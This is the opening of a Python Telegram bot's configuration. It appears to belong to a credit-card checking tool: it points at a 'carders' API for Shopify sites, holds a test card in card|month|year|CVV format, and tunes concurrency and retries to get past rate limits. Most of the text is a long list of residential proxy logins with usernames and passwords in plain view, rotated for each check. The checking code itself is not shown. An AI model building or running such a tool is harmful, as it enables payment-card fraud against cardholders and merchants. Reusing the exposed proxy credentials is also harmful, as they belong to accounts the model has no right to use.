import asyncio
import random
import aiohttp
import os
import time
import re
import logging
import io

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router, Bot
from aiogram.filters import Command
from aiogram.types import FSInputFile

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# ADD YOUR TELEGRAM ID HERE
ADMIN_IDS = [7963961151]

# Test card to verify site functionality
TEST_CARD = "4000223372377978|05|29|651"

# API Configuration
API_BASE_URL = "http://carders2.up.railway.app/shopii"
#API_BASE_URL = "http://38.247.142.170:2000/shopii"
# FIX #1: Increased timeout from 30s to 45s — many Shopify sites are slow
API_TIMEOUT = 90

# FIX #2: Reduced concurrency from 50 → 10
# 50 simultaneous requests to the same API + proxies caused:
# - Mass timeouts (server overwhelmed)
# - 429 rate-limit cascades
# - Proxy exhaustion mid-batch
CONCURRENT_CHECKS = 30

# FIX #3: More retries with backoff for 429/timeout
MAX_RETRIES = 10

# Delay between retries on 429 or timeout (seconds)
RETRY_DELAY_429 = 3.0
RETRY_DELAY_TIMEOUT = 2.0

# Proxy List - Rotated randomly for each check
PROXY_LIST = [
    "geo.floppydata.com:10080:1Tjfl9Wm4VBIZDI9:c7tNBYe0ijBM5vrc",
    "geo.floppydata.com:10080:r3NR7y5cjEstZWsZ:W1LYoYp3hcK8gkZf",
    "geo.floppydata.com:10080:LNstDCWURTcxiNwS:Ia8dM5jIa8P6d3tI",
    "geo.floppydata.com:10080:9ripqeGWh6ABiJh6:RrfbayqWf2QqnhMU",
    "geo.floppydata.com:10080:K7HsCmSbGkyDoErY:dpOlHV1bd842WUbE",
    "geo.floppydata.com:10080:522HT3OBP7U0GPAg:XdNJjXxdHKEVIOGU",
    "geo.floppydata.com:10080:MZdcgAS7XVQD4acR:4j2GvLmxz6D6GT4E",
    "geo.floppydata.com:10080:DigSBhOupxCYQ6ig:A2OGmgsnn4E01naQ",
    "geo.floppydata.com:10080:c1gAyvbaTYFe5rDQ:HyXHJlouSRuy7ADG",
    "geo.floppydata.com:10080:3ralLO7acWJ2GTRc:V2ExQ7WaoO45rmwz",
    "geo.floppydata.com:10080:aT86WF9d9S9jMgzO:oQ0eF80NNCUoKatB",
    "geo.floppydata.com:10080:9yXLCgu8SC86XTKZ:q5BxycqmMYIg7id3",
    "geo.floppydata.com:10080:ZUEDeQgBsQuvHZKe:fdpcEG1KTY2WgcUC",
    "geo.floppydata.com:10080:e1958CSTsRY9hBIe:73fmbY5Cfyk5stEn",
    "geo.floppydata.com:10080:Ue5Xo2MER4DSmYPx:l1RGY5JjxoC0zqOT",
    "geo.floppydata.com:10080:1aqVVZTiad8VPhjz:k18xBU5q4vS7l4na",
    "geo.floppydata.com:10080:ESqU9aztJXYKrKuK:em3IrB8B2OoPXi2O",
    "geo.floppydata.com:10080:qkJWtyUEe2uvcEFm:gMg6csdOY9iSEsG5",
    "geo.floppydata.com:10080:KBM4lJwPCdjhfhP3:53PMRffIM0EosxDK",
    "geo.floppydata.com:10080:yfN1U8G7ccNYbCPp:n0lkBHvgYLUOG4Lh",
    "geo.floppydata.com:10080:ah9DZjxZyXBaHYBD:R2J6tYNyYyzIuXZG",
    "geo.floppydata.com:10080:2f8uRxBwvWv98tLy:obOTjsEsoQzG9O8Z",
    "geo.floppydata.com:10080:6YCZXt4n6GanHMDF:KLrINaeoHxeikxaT",
    "geo.floppydata.com:10080:vOJ24pCa61UBaw99:DXwp8wrpjsdviBrn",
    "geo.floppydata.com:10080:l74f6mIMNyTy5stE:LxS2tdlhpJmP77N1",
    "geo.floppydata.com:10080:4AulhUzmgTsUoIMv:clYBKwTkBC9Ffv4y",
    "geo.floppydata.com:10080:iyvw4309SndrzrzU:9HeDakzBAmjs0zmD",
    "geo.floppydata.com:10080:d9GzeQsbpDQI9Mwm:XEAplhBFmB8iPf11",
    "geo.floppydata.com:10080:Y9ykqcV5Z0jHRMe7:RDiJILzVvKKeG6i7",
    "geo.floppydata.com:10080:DYWOi49tGY2sGAMC:o9Kx3hdSwVf7JBl6",
    "geo.floppydata.com:10080:j57hZmZQfUNkeugA:CbzOZjbAfFpV3ap8",
    "geo.floppydata.com:10080:6VMu5bAijE4HGUOo:JFYSfYCpozeoTpmx",
    "geo.floppydata.com:10080:63uVXJp80BuYWJI5:s4HlPL1X7EPAJlVS",
    "geo.floppydata.com:10080:F1XsabPw7DmQZgpr:nQohCXj6BMhVcwQf",
    "geo.floppydata.com:10080:JKTyRGfaOyxH7OFQ:ZXW9UCpqZW7JjkOU",
    "geo.floppydata.com:10080:mY0y3fRSMb1EFly9:7UDgXBhI8NlIIzpJ",
    "geo.floppydata.com:10080:ThfHo1iXwjoqb0wQ:XwWntMsAGn0lmG0t",
    "geo.floppydata.com:10080:NJdbwXlVWKAfzNdT:t0IxhOQ43fesumyD",
    "geo.floppydata.com:10080:QgJTuy8GCGIJ4cgj:Z7YGyCFQWPNWDMyR",
    "geo.floppydata.com:10080:kaIS6BAeGtBc4QzS:76ZbNOhKxOWzdJu3",
    "geo.floppydata.com:10080:qQyn4XLU3gEzxnPC:YnxJ1f9JRsKdRZyE",
    "geo.floppydata.com:10080:qQdxYQ8TBTL8K2tZ:hjdy9RvzCrTGpFpp",
    "geo.floppydata.com:10080:yhTirVJDLYfTS43u:0hGIKXeRLSHjFGFW",
    "geo.floppydata.com:10080:gx7URbAINYpXZN5B:qkWZGkszS03IYe97",
    "geo.floppydata.com:10080:AWBeFVjJDoJEPMSS:RTI6VMqZukveZRAN",
    "geo.floppydata.com:10080:c3gi6oGLrQKLxEcy:iJTkmWJblyl9EVxD",
    "geo.floppydata.com:10080:vMvPhEqY8RhG5Wmz:XETNeOu0fhIMCqGq",
    "geo.floppydata.com:10080:OehHf4M2kyIJbq7B:d0HRz8SsmpMZmosJ",
    "geo.floppydata.com:10080:p0QcnfCCV5NfoXpd:vCmX08FBHEPpXlX8",
    "geo.floppydata.com:10080:jufzjYtwNAZwF0ta:u19xWKa0c9w47eY6",
    "geo.floppydata.com:10080:0qvWDJKhCd1w64as:KRCb3b7yD7n2jPJh",
    "geo.floppydata.com:10080:W5ZTpA8awWfm4HxR:fdNkw81xaGknDKrL",
    "geo.floppydata.com:10080:caOsJhVNo8URlMS5:5gCi11lvqoRPEyq2",
    "geo.floppydata.com:10080:EYoUZWPkyJLuHrOK:2Z9UUQck2v6uKSlw",
    "geo.floppydata.com:10080:Uxf928OK2Actxoh1:i31LiDYR6lFakSrR",
    "geo.floppydata.com:10080:9JsNy46V7JhRpdhc:3d6tJOVItR8EaiQo",
    "geo.floppydata.com:10080:RapzpQZqbV04TJWp:AG6uynBL6ocO5vQs",
    "geo.floppydata.com:10080:tQO9O8Qobeyxbtt7:v6YT5dmzd4Tp7aPf",
    "geo.floppydata.com:10080:PX4MWeLT2FHy3Uzx:5fQf6HRRMZt4UTjd",
    "geo.floppydata.com:10080:ljzxMKFJKZECDcbA:E8KPBSNza3s0oPDT",
    "geo.floppydata.com:10080:gtxtkirovs0cHhTg:3LoiiGs7XB9URbWF",
    "geo.floppydata.com:10080:MhxVNHPg8XQUyhHZ:aYCx1QWgSRz6Uv3n",
    "geo.floppydata.com:10080:2yMrOCO8Y9RZGfkP:d0atYGwUbDFisnG9",
    "geo.floppydata.com:10080:vTnFN97kMKkJdPqC:ScuKeSBnBOCpVnJd",
    "geo.floppydata.com:10080:nQwOcNq9KqiEEbad:Tp49waWP9u979vQn",
    "geo.floppydata.com:10080:7rs7pfFHtPCriPVb:eyhtdg2FftIrpvSo",
    "geo.floppydata.com:10080:5mPJSGcoaHeCI8o4:DHznzpx5yMnzPYfe",
    "geo.floppydata.com:10080:ff0ISyW1YC2KxRqy:padndJsms9tQAlAC",
    "geo.floppydata.com:10080:LRebnL0dztQQCZlO:Gcd8hpOkJYG6Lw1u",
    "geo.floppydata.com:10080:pIR5s52wXpyFWCjf:AMSoAyGfgpgiFPmB",
    "geo.floppydata.com:10080:gXW9bXCKMEFVER7j:yMFrFg8neAkxfWX4",
    "geo.floppydata.com:10080:FNHWeiCgG1Wm0FqI:PFhy3fcrNGAVGfNt",
    "geo.floppydata.com:10080:Lb3zPleEfQd4Pra2:kmJOEveCqPlfl4NW",
    "geo.floppydata.com:10080:IoG0iwNdr23IMe02:hyM8MCRpPWT7eaQV",
    "geo.floppydata.com:10080:HGCviU91oa9SX5vO:3DIMSdGKGSi7TKfp",
    "geo.floppydata.com:10080:PYI0lTgL8aU8k8mt:9sdC9Voo73HzuhHK",
    "geo.floppydata.com:10080:1Im5112L7TxroEKs:zMSg8GkL4DHFzF2b",
    "geo.floppydata.com:10080:JkGil8RQLuDThjbG:LgIInxqfNxeIASBb",
    "geo.floppydata.com:10080:lPCxmeu2I3hXy17U:ZcbNKZ3MkU1ZGmT5",
    "geo.floppydata.com:10080:th4321CtSttLg8W1:3VOXgS72a6f2umGR",
    "geo.floppydata.com:10080:aCpLQ7UP3m8Cmmyw:SgLcnBEP8gDRn7df",
    "geo.floppydata.com:10080:zRUOVhczjNnjRQtI:crFszFKdFtNlF7aP",
    "geo.floppydata.com:10080:MlglJti5ET9tADUj:w8CbIw4fqSbfMq9q",
    "geo.floppydata.com:10080:VfXOG7C8hfHZrmel:lGLA3aio1mJfVFdR",
    "geo.floppydata.com:10080:E83frxk2m0jZDQ6G:VGdPxd4qC0TitLKM",
    "geo.floppydata.com:10080:sOeLo44amZuvdpt2:Gs5g8NVcbJ7Zv1ge",
    "geo.floppydata.com:10080:cRuT4MuBJTdkIYP1:iASlPFKCfUT9dIfC",
    "geo.floppydata.com:10080:tl8f97vT8F0GzHdK:UTv2XuHMCuJYzYl2",
    "geo.floppydata.com:10080:TQmbBuSy3ObGXsbQ:O12g08cF78E3EvqS",
    "geo.floppydata.com:10080:uxBoQz8R9WIqEFbz:Y74z1u6xHgYO6hKI",
    "geo.floppydata.com:10080:dH2ju7d1tH152pAw:5J0Lord8ASWtIlC7",
    "geo.floppydata.com:10080:YTn1l6jPEaxS4eCS:mAUo7fArKmqkNkBj",
    "geo.floppydata.com:10080:ShMNYYvdGPH8a297:LD5rUUwAevkpeZ9O",
    "geo.floppydata.com:10080:6WH9hQ1OuQjmDRX2:z3ww2K7HgE4CkavW",
    "geo.floppydata.com:10080:yTebXXTHiXBe2zz3:jKfbW9eJaUd5Qw20",
    "geo.floppydata.com:10080:9uNv597mUgWL8Scv:wSYqXUMBYHmNxZAx",
    "geo.floppydata.com:10080:I0WHdvTPkqglf7DE:DaP90IuQZHz5dYwb",
    "geo.floppydata.com:10080:KG7vYH9sEt8QcJEj:w7kIiKY3e1SFadFe",
    "geo.floppydata.com:10080:g2UZZ5mWDW2Gb4JD:Kut4U9PLLpv8FUy1",
    "geo.floppydata.com:10080:f4w7i7c1XY1MpHqx:HH3RG8xLrkTjMh6m",
    "geo.floppydata.com:10080:rCKamYzG11pu6J5p:lqifoNjAELZwMfX1",
    "geo.floppydata.com:10080:32KkVnhrUKVGoHZf:EVGrt2n6QMsmPDV1",
    "geo.floppydata.com:10080:WjuwpoKRdfbgBZJ6:mCbPgLY7NJ5DF5xV",
    "geo.floppydata.com:10080:b8Q41oLsrCVrYAXe:ARdN1mqj7C33n5Wp",
    "geo.floppydata.com:10080:lJguqG0Re6VbCN8M:7fivLn4jUkdYtyiw",
    "geo.floppydata.com:10080:P98FB3MG2D16NPI5:WPibtZ4FqyS3ElX4",
    "geo.floppydata.com:10080:lsVlhFLKyqxG9juV:WPmkztDpijrVyV9t",
    "geo.floppydata.com:10080:z8ga0tCnsgE4VrpV:SBhXjntp0vsSOh4H",
    "geo.floppydata.com:10080:L0LkeOdOpDsZyldD:GnfiGTahv9oabLm7",
    "geo.floppydata.com:10080:JSCbCxNR7yX9zDfZ:BMSo1k43vKyNdOhi",
    "geo.floppydata.com:10080:ybhrOwscPiiOIKY3:Hu9SOdDGt0wVNRIs",
    "geo.floppydata.com:10080:YPRGIy4DWKA8Owbz:DF5YoXiVpwo2t0UF",
    "geo.floppydata.com:10080:Rc7aJb821rILs1XR:HBCxrVpTkAQ8Hj6E",
    "geo.floppydata.com:10080:12pbAvOo809WNHEr:KREaoHgc7OcPOoWK",
    "geo.floppydata.com:10080:UZWqtjXynfNbLGaa:YvYADy2kAvNBnflg",
    "geo.floppydata.com:10080:z8sgq6qnfFxHLTyx:Od4lQC7qlgWqD9AN",
    "geo.floppydata.com:10080:3ltAOGS0l4oCDeAI:6mXmYCZKN9PO9zHN",
    "geo.floppydata.com:10080:m3ix6MM2gIRZAQ59:EbxFwhwGhvM9won0",
    "geo.floppydata.com:10080:KbqZpsnjivQEUeym:2EfvS3G0gINYW6Y6",
    "geo.floppydata.com:10080:6uzpj08AhxBXUQmt:RFvVgHmK4Zs2p9U5",
    "geo.floppydata.com:10080:k0RaUOifAg1EZ7ub:Muzo6NfHukfjfKzB",
    "geo.floppydata.com:10080:JQeNRBnRUtUjgOuk:d0MOZ0p2L7UnxZb8",
    "geo.floppydata.com:10080:Snmx7KrYHv3pYoHW:2VIIE8U8av2YaZmN",
    "geo.floppydata.com:10080:JeUicNQRaN6Tysnc:3GAMlNj4qasTzDUq",
    "geo.floppydata.com:10080:O27m3ORYZ5qsicGF:kBWHzFxq1iTDY0vU",
    "geo.floppydata.com:10080:hgbS625NjkfcC5wH:VMfcyWQ2niKjyzm9",
    "geo.floppydata.com:10080:C9XpBT0fIqw6tVRm:MB7vqg08hGa89yhb",
    "geo.floppydata.com:10080:TWWNk85bqUafNFgh:ckqUnf855v0stFS3",
    "geo.floppydata.com:10080:akTzU5UF1V9hHocg:RdtV7oH9NKbI0Wx2",
    "geo.floppydata.com:10080:M8eKVSkpReC5kTrg:g0NnLX0KwhaXtzzt",
    "geo.floppydata.com:10080:PHrFYROK5qWCNAHn:LIuqizmPHeTpxDXF",
    "geo.floppydata.com:10080:PPIfw0viMEIvd4IF:SnrxHY2j6xA6jWWw",
    "geo.floppydata.com:10080:pUkv1vGiRd7cZ8J3:1MOeIsmFVKYZy5HZ",
    "geo.floppydata.com:10080:oicTz9VoN2Ws88GN:NcIG4usZ2YVwK1b3",
    "geo.floppydata.com:10080:NdDTZHpmpICrq5o8:Hr7XC9On2HHzoOjW",
    "geo.floppydata.com:10080:taBp5iNd1qIBojEU:6usAdi1aLL68znyj",
    "geo.floppydata.com:10080:j1uD9qifz1rf6U5j:gFLOqqRZTTiimRae",
    "geo.floppydata.com:10080:s3kUMAK1nE3GCdDy:dSCJjVGtmKMw0ZHN",
    "geo.floppydata.com:10080:OHUjcPqQHyITbRm0:aOvXu1MO4La87zQJ",
    "geo.floppydata.com:10080:pPHYlOsV4Riuie9c:BKegRwAiuvQ2GFOq",
    "geo.floppydata.com:10080:pLgYjc9USxXIqCaN:tSfpWvdpJFmFy0FV",
    "geo.floppydata.com:10080:irSuFwhQwfDcM4E7:HOgq3R0QiMHJBYPp",
    "geo.floppydata.com:10080:8nkqhWwZV6ZViaiL:BfsxL7j0rDtadkGG",
    "geo.floppydata.com:10080:m57F11qf5C7XBnvi:ZoS6QLRJQqwcYi2Z",
    "geo.floppydata.com:10080:tODr0IxDlgI7XXdB:U6yzwCBUiKzKmw0a",
    "geo.floppydata.com:10080:LYvs1fBDNRPOiuoN:IIqeBwXnRuGrH4JA",
    "geo.floppydata.com:10080:0hu3vUo1xpT2pcZI:mPutCp8zQfopb6e5",
    "geo.floppydata.com:10080:DXOBs3jjw2llSzhW:3Vm509Xzaz4y7JpK",
    "geo.floppydata.com:10080:h8mdw7DCSDqLPugl:9fFQwj46LOBaWbrg",
    "geo.floppydata.com:10080:a78edyD9XBinmtBS:u9DJ6hdUBo1FGW1z",
    "geo.floppydata.com:10080:pxINCqgZDOIqMG16:AtqZ6vYjlESXldhd",
    "geo.floppydata.com:10080:wERU6oiESbhZ41x9:YK7VnGVdyqUU0XkN",
    "geo.floppydata.com:10080:8E9YQAqBK6MbH2Zv:X1mLEqoWDImlAGtF",
    "geo.floppydata.com:10080:4FhoO6iCiz0TlqUm:NX3aOm9SG3lZ3hWO",
    "geo.floppydata.com:10080:6YpfLV6Ut9LS6bkm:4MR9p47VlH4nMj1Q",
    "geo.floppydata.com:10080:EjTU3S1AZdFsw2r2:JqD918Zrfk9mKG1N",
    "geo.floppydata.com:10080:Qi0RRlis0cCsp7IR:NiOHlDhpm2NshvxH",
    "geo.floppydata.com:10080:UKLSdZ5EPE82I79f:5W4e4ei1o0nkDmWd",
    "geo.floppydata.com:10080:RQ0S4u1RmjTTegtv:6vUJT2odtU0zieQp",
    "geo.floppydata.com:10080:E1Io3Q9xPkBWxqCj:GY02c16vTmDLe3Bi",
    "geo.floppydata.com:10080:8zxAyVvpFLcG3B4J:cK89iZWzlpOEEEbI",
    "geo.floppydata.com:10080:19s2o06Cko4l6lNp:sU2Xvbyqeh1UAM48",
    "geo.floppydata.com:10080:wXhADY7I37G3rZY9:qEZ7EXemVtfhMAzH",
    "geo.floppydata.com:10080:uFVMGsySCBSJxgTU:KG6lyh8Gu5upQvB4",
    "geo.floppydata.com:10080:nSwdrrV2eBWackpk:FajKhJG3wdOmMvQU",
    "geo.floppydata.com:10080:H8pJumO72JSTu22J:ibISKXU3IBgc78ax",
    "geo.floppydata.com:10080:QkRExs5R0MUVangZ:YRjHJ0foSxyO0AGr",
    "geo.floppydata.com:10080:GlHbHmDdmgJKAQ0M:aLypXrtXVu6vXr3K",
    "geo.floppydata.com:10080:5fnXuw4Qb0hDv4L5:BAKz2zaZ18QPRozP",
    "geo.floppydata.com:10080:PCWJMmZWtj0cRrnk:ntqc63zjjQ5jJi1E",
    "geo.floppydata.com:10080:GmY6CP6nQSCqPPfv:mf2oqohebk8rvTcJ",
    "geo.floppydata.com:10080:L1G6mdPQYRoNvCuu:7mW28MIgBUicKert",
    "geo.floppydata.com:10080:t46yKYRRD2E3LFCU:iACjc4lg7enqnfxW",
    "geo.floppydata.com:10080:WOMNMnNg10p0fChM:G8KbzKgYwxtNJvmS",
    "geo.floppydata.com:10080:6EESiqYsxN3hne9K:YVTsCWkZug2L0UXr",
    "geo.floppydata.com:10080:63sciHKpKOxwU2UQ:SouwX4AeKc1byjN2",
    "geo.floppydata.com:10080:UcFqfCCVyrfVC6hU:hBDvGKMB0sYw1UJN",
    "geo.floppydata.com:10080:MDSXJfHYEJPCJEkD:ssX1ii148PSiMDVR",
    "geo.floppydata.com:10080:8Xgkbk9URNxAsGAi:N1blJiNg96ncI6pM",
    "geo.floppydata.com:10080:lSO1Pz6OHilGXHnC:uSWsjPsaOBf36xkv",
    "geo.floppydata.com:10080:E0EoDPbcvThGprIL:tD0DYh9pDeK07QBD",
    "geo.floppydata.com:10080:QYIY1T5gQ80OLynW:fxjLlVHVDQpWqToY",
    "geo.floppydata.com:10080:gU6Dzv9S1N0Txeos:JMuD2Yw6teEJG9ru",
    "geo.floppydata.com:10080:3fkewgfascUUdRCF:qZnroZofR5oUgQ8A",
    "geo.floppydata.com:10080:KSb5JzltJ4d8xyWK:dU7mnOPnnJZtqlYw",
    "geo.floppydata.com:10080:q9tuq8Pb829qLRIW:hrR3U5NkLDjaXJVl",
    "geo.floppydata.com:10080:aod2rjRQa2lm5HM4:E8rOyZ5tyhIRZs1u",
    "geo.floppydata.com:10080:vaOEXpmLpByAwmPb:ch11eK908rN1gQjv",
    "geo.floppydata.com:10080:uE3COQSg21DL0vVc:LDiH8Oi0NwTI07G4",
    "geo.floppydata.com:10080:YB0QoDttlrLELCVZ:S7vaCPqGqyrGZGp0",
    "geo.floppydata.com:10080:cjkYeFRkyxB4Jwe9:Zpql1rjuPoarqBZ5",
    "geo.floppydata.com:10080:XzW7zTKrPrcz7LDF:8dFafJALyJaX5dB6",
    "geo.floppydata.com:10080:rhq5U7JyDvnRIWYe:H3yJ3ZarkyujNNal",
    "geo.floppydata.com:10080:GTfeaFwsO61Fkn0F:6B3pS0KpWXgiZaMy",
    "geo.floppydata.com:10080:I5CE8wOogAlWvONq:M8ZEeApoGL1dN3KF",
    "geo.floppydata.com:10080:oWtSELAsThG41Dvq:4h7AtwPHJEWlQ3Hv",
    "geo.floppydata.com:10080:DjJitWwQqKfTGyg4:1i30H3aQrlBcdIfQ",
    "geo.floppydata.com:10080:4nZkfKkNIPO5XkUZ:abXrdhDraftcxbEE",
    "geo.floppydata.com:10080:LkL1GwTTJ1S728kb:YwceIURnDpiDCjJG",
    "geo.floppydata.com:10080:L9bPf2JtSxKwT8XF:F4Oda5h2g811smvD",
    "geo.floppydata.com:10080:5djtKiDuX1YV7ZeG:SZAwxEO47R29UGBr",
    "geo.floppydata.com:10080:awHsBI9bPLJp3Dbz:oNAFbVxU3Te7C1GL",
    "geo.floppydata.com:10080:VqOz1d2YZONeXrlT:OIpjOLqAjglwrESP",
    "geo.floppydata.com:10080:esfAlO8A5QunNY3U:nyMl74n4E5kAfAQa",
    "geo.floppydata.com:10080:1n2Et1ESjmgIiSBw:RxrVpp4zBRfgxhoM",
    "geo.floppydata.com:10080:sOo455NuVJWSikix:4GM9cb0rNncwld3D",
    "geo.floppydata.com:10080:Zj4jJDt9EkOqMBuU:IfNFiyrA9OYSjLeE",
    "geo.floppydata.com:10080:rtRcrkYl0Cs9kagD:mbhfGegqbE3lO5cr",
    "geo.floppydata.com:10080:I5mb66qymQRVxXwd:wn8GfsXYe0gHGYuH",
    "geo.floppydata.com:10080:6ExvuZSn8BCd3WqI:Kpi65UPpzcJo7beO",
    "geo.floppydata.com:10080:fqMKv6OdfvlvC4WM:m98FBvJ0QVy3p0eH",
    "geo.floppydata.com:10080:OEB895nCkf0OzL0N:GlpoCV6jrFGzLr1n",
    "geo.floppydata.com:10080:LavrP7opjLnHpDO5:KcA1kRRaun6twrXj",
    "geo.floppydata.com:10080:ts6edsHEYj56F9My:cqdOnDEQnt8AkjQN",
    "geo.floppydata.com:10080:86hd5HqdTlX8Bn4S:L8KRiNrSo7OrvwtC",
    "geo.floppydata.com:10080:NZUT8Dhqhircu9bm:LlhBjkiiMkWgJ5P3",
    "geo.floppydata.com:10080:XUNdljhuwTheaj3g:teJMJbre4VitTUMZ",
    "geo.floppydata.com:10080:m4NH4K4zTw5wwrIo:uXYQEwKEPLDMGb0U",
    "geo.floppydata.com:10080:PYgBgNsXVzgRj4Vd:2nSdRrw91XAQmLQH",
    "geo.floppydata.com:10080:sfGcuqW80Kqof60U:i4SUNBpMJ3BPmfYU",
    "geo.floppydata.com:10080:eD3XR3PS5t7eITIQ:OQspuNX9xFzFLpac",
    "geo.floppydata.com:10080:IJJQNy9z6eDSBdB6:iq489q1s95WpIlYv",
    "geo.floppydata.com:10080:J1jwCJut6tRPISNv:EiE9bJrvgwc1KCzk",
    "geo.floppydata.com:10080:K3upQHCI5vgjOKQM:9IqsrJvAbzR82pTD",
    "geo.floppydata.com:10080:IAvtHDHgyT3AqmFf:g60ZgjpvDmcmZjwV",
    "geo.floppydata.com:10080:xxxv0nZWwrBJ8wC8:PKfBxK6OyCqWd8K5",
    "geo.floppydata.com:10080:Cg7uFyy7erV4acW5:kGpZUrzEiMSsKFmX",
    "geo.floppydata.com:10080:6VkWi4yrYOfGzpA3:Mga6RLLjgitcKyfW",
    "geo.floppydata.com:10080:FIk6baZcJydRcjpt:hoHg33bzB863N6bH",
    "geo.floppydata.com:10080:B41wRyItCK3Hdoga:ly6MZl9K1oJDbJdD",
    "geo.floppydata.com:10080:qNTZtzUembCRLc7h:VLTozRKnEtAskZ1S",
    "geo.floppydata.com:10080:mAl48k3ItOhSyGht:xqqqv2yyxFkU3NJ1",
    "geo.floppydata.com:10080:rHsp0J2LKD17UVsR:i682VbKrV4hGY8gv",
    "geo.floppydata.com:10080:buFYGWOeZl1GyFEy:B02mUBjBJgrnhRkX",
    "geo.floppydata.com:10080:fuvQ0BSXBJfnXPe4:IzjAFqPqFSwpZfcN",
    "geo.floppydata.com:10080:UT7a1uLrfEZlKful:meM6PJg4h7NHCOkd",
    "geo.floppydata.com:10080:fpNTfWmHoYLaVAdS:k8dZBhy1HNDvYrNH",
    "geo.floppydata.com:10080:Auj9Jf43BDdOO2sS:qoozarBBCpKlox5e",
    "geo.floppydata.com:10080:ss1kzJqqNSrghBpj:Fr9OKrPBSAsRUIPZ",
    "geo.floppydata.com:10080:J1pAtkcX7PrYxBKQ:AVpHTaHa1RwfnDaK",
    "geo.floppydata.com:10080:IexXsa8yAsbGwKoE:hBkcGav89oRo70T2",
    "geo.floppydata.com:10080:l5FcZahC5y9edMI7:hDn7IAxhdBaPVQe2",
    "geo.floppydata.com:10080:NaOx0wmR3UuPiNeI:kSJdLn04RPScK4hr",
    "geo.floppydata.com:10080:4fA5OK6ZeUvVW1j4:sWq8eUowV7AOX46m",
    "geo.floppydata.com:10080:stNpV9VF0CVufncD:qGkW29iTqHabbTrB",
    "geo.floppydata.com:10080:PLBdfWPHCo9TgNES:jodYo3GbKyOzvGdY",
    "geo.floppydata.com:10080:ijSWNslBd1WdGrPt:lPN1dnCjuWq2lBTU",
    "geo.floppydata.com:10080:pKUW78d8IlIDdzmJ:akKDT8VqJFrD4bth",
    "geo.floppydata.com:10080:s6IZMIPbMZrld3Gj:ffysmanblikPP2pq",
    "geo.floppydata.com:10080:mrmWp7ihi9ogqOb6:dD4uYuc7p8z20FZK",
    "geo.floppydata.com:10080:6V3u1V9ICjB4dCdy:EfhS70S4A9NwdGeD",
    "geo.floppydata.com:10080:jRZ20NzMuyG7IlxZ:45jseEyqa9Z7mz4m",
    "geo.floppydata.com:10080:cvr3CZ4Hd9jkD5tY:VZnFaYujeIGDqmAA",
    "geo.floppydata.com:10080:76MyQpxPti1oNqAR:bv8D8m9PUMeRZsQe",
    "geo.floppydata.com:10080:99XA5zaNTt7qtKGW:3D7ApQp2gkKkYWjW",
    "geo.floppydata.com:10080:mYpjMNr22tpZM4DC:UDft0omekxXrhK4J",
    "geo.floppydata.com:10080:i2XpPOiUTIiQIpd3:rDNu1IYRBPFU8fP1",
    "geo.floppydata.com:10080:RsLjAeyuXu0rVnyA:kg1f1KumW4rAInY0",
    "geo.floppydata.com:10080:lbg0VY8TXuSzxnBE:vq3xz0Baz6KjWkYu",
    "geo.floppydata.com:10080:9eQPtuokjTN8hrWq:N347PwKWfnNoOU87",
    "geo.floppydata.com:10080:vdccYwRlviKlj0Es:BdyfWdLCUbTh3KC8",
    "geo.floppydata.com:10080:WVEcknCgm9pCpxuE:NMepsbEpSvFTxlky",
    "geo.floppydata.com:10080:Jx0rY4SNprYEJsnd:RykGXaX06PLthtq3",
    "geo.floppydata.com:10080:zTBzb4c9GsFH5ukg:zLMdQ4SIQQVSW5hD",
    "geo.floppydata.com:10080:46ySLMMs7gKI6tVX:6VntqXXVjF0Ku7wV",
    "geo.floppydata.com:10080:y4xuXd6eBBQOplB0:Xx1VEFBYj2nmd8RM",
    "geo.floppydata.com:10080:buIv1r2fArdla0PD:CaZ0T7rHtsaW5dTQ",
    "geo.floppydata.com:10080:5BCPVYIEYcYOpQK0:ekPlwrU2n4TMPI4o",
    "geo.floppydata.com:10080:CCCVHZK1XMnsHTSQ:KYxwUX1GVN26Pi8u",
    "geo.floppydata.com:10080:F98LoCdJrBnQ26DU:GVxGxeXnad6gfINp",
    "geo.floppydata.com:10080:4g15qbjMRdJbhm38:8jpKVBCAQejprzg9",
    "geo.floppydata.com:10080:iwp14nSHQQRqJ3rd:nqVjfpwxaxVv6YiS",
    "geo.floppydata.com:10080:IAzvTNnlOjTjDBwD:Kq1v6SAMMNHcxu0S",
    "geo.floppydata.com:10080:e7Fj2kXn7fpJ0Fk3:g1U1qfMAvbET2NyM",
    "geo.floppydata.com:10080:61iCASzpqSwSQEi4:n5yqwPykcqk6PV5h",
    "geo.floppydata.com:10080:uUdnGOn3HWKZlnsL:MBF5fGGEVNjpKdfg",
    "geo.floppydata.com:10080:j41iReQog18p2Uod:37LkYvUfKOeGa2KI",
    "geo.floppydata.com:10080:VSSt2UMrjMi3i5re:B0xCZAGqnY5Yq8Wz",
    "geo.floppydata.com:10080:mTQUAtZMY2xocHwd:nHLkHUZvkGMpcq4m",
    "geo.floppydata.com:10080:pMHteSucxLKpoAPX:r4NcsO6WEuoM1uIJ",
    "geo.floppydata.com:10080:bPyM3chyWYhH7iWo:ha9j7gJWffYdwltt",
    "geo.floppydata.com:10080:9iHtW2oCje4UZdPm:rzHNRiVP0R2R3ddO",
    "geo.floppydata.com:10080:hUE9GJB6n128VroW:1GNMqZF0mQ6KjPfT",
    "geo.floppydata.com:10080:rAd6vUm07RS7MXh8:YEllyIElikUkDDej",
    "geo.floppydata.com:10080:kDtxgquaE01G7AEK:cWF6rj18JPnLbefX",
    "geo.floppydata.com:10080:rEKT5GAUrCoUSVSy:dvw71cTn53eSEoGR",
    "geo.floppydata.com:10080:8gvaWFXYZaHMiVLK:FKjuM03k2H3OGuWf",
    "geo.floppydata.com:10080:ipicY5lqWdIBh1rO:y7LcFd2mDkf9pmjS",
    "geo.floppydata.com:10080:OJzWeqBjrCpUBid0:Aojf5zv4arvXESWm",
    "geo.floppydata.com:10080:smLUHFhpOleEpUOW:BWheDNJOdi69KORV",
    "geo.floppydata.com:10080:MtT4CveIzi75w5EK:M8v9LnxigzbLDQsC",
    "geo.floppydata.com:10080:x7VuRJllTVvHhxKM:zhDBLl1Vx2VrriNN",
    "geo.floppydata.com:10080:2yYKoqDvDk1BKAom:Lc0b5iOKPXAuza2D",
